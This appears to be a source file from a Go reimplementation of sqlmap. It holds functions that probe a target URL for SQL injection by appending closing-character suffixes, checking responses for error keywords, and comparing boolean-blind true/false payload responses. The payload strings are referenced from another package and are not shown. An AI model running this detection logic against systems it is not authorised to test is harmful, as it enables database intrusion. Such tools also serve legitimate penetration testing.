package line

import (
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/str"
	"github.com/EmYiQing/go-sqlmap/util"
	"os"
	"strings"
)

// DetectSqlInject 检测是否存在注入
func DetectSqlInject(url string, method string) (bool, string) {
	for _, v := range str.SuffixList {
		innerUrl := url + v
		code, _, body := util.Request(method, innerUrl, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(body)),
				strings.ToLower(str.DetectedKeyword)) {
				log.Info("detected sql injection!")
				return true, innerUrl
			}
		}
		_, _, trueBody := util.Request(method,
			innerUrl+str.BlindDetectTruePayload, nil, nil)
		_, _, falseBody := util.Request(method,
			innerUrl+str.BlindDetectFalsePayload, nil, nil)
		if string(trueBody) != string(falseBody) {
			return true, innerUrl
		}
	}
	log.Info("not detected sql injection!")
	os.Exit(-1)
	return false, ""
}

// GetSuffixList 获取可能的闭合符号列表
func GetSuffixList(target string) (bool, []string) {
	_, _, defaultBody := util.Request(str.RequestMethod, target, nil, nil)
	var suffixList []string
	for _, v := range str.SuffixList {
		condition := target + v + str.SuffixCondition
		_, _, conditionBody := util.Request(str.RequestMethod, condition, nil, nil)
		payload := target + v + str.SuffixPayload
		_, _, payloadBody := util.Request(str.RequestMethod, payload, nil, nil)
		// 双重验证只能尽量保证闭合符号正确，得出有最有可能的闭合符号
		if string(defaultBody) == string(payloadBody) &&
			string(defaultBody) == string(conditionBody) {
			suffixList = append(suffixList, v)
		}
	}
	if len(suffixList) > 0 {
		return true, suffixList
	}
	return false, suffixList
}
